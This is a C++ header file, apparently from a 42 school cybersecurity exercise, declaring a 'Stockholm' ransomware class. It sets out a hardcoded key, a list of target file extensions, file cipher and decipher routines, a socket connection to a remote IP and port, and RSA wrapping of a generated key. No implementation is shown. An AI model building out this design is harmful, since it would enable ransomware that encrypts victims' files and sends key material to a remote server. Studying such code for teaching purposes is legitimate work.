/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   Stockholm.class.hpp                                :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: xxxxxxx <xxxxxxx@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/09/14 13:51:53 by xxxxxxx           #+#    #+#             */
/*   Updated: 2023/09/14 13:51:53 by xxxxxxx          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

class Stockholm;
#pragma once

#include <string>
#include <iostream>
#include <filesystem>
#include <vector>
#include <algorithm>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <cstring>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <random>
#include <sstream>
#include <iomanip>
#include "constants.hpp"

class Stockholm
{
private:
	bool _help;
	bool _version;
	bool _silent;
	bool _reverse;
	std::string _key = "oursupersecureencryptionkeybakedwithloveandchocolaterlynobodycouldeverbreakthiswdymthisisntsecureatallandwecanjuststringsthebinary?";
	const std::filesystem::path _path;
	const std::vector<std::string> _extensions{RANSOMWARE_EXTENSIONS};

	void _printHelp(void);
	void _printVersion(void);
	void _decipher(std::filesystem::path path);
	void _decipherFile(std::filesystem::path path);
	void _cipher(std::filesystem::path path);
	void _cipherFile(std::filesystem::path path);

	struct sockaddr_in server_addr_;
	int sockfd_;

public:
	Stockholm(void);
	~Stockholm(void);

	void setHelp(bool help);
	void setVersion(bool version);
	void setSilent(bool silent);
	void setReverse(bool reverse);
	void setKey(std::string key);
	void run(void);


	int runc();
	int init(std::string ip, int port);
	void generate_random_cipher(std::string& plain_cipher);
	int rsa_encrypt(EVP_PKEY* public_key, const std::string& plain_cipher, std::vector<unsigned char>& out);
};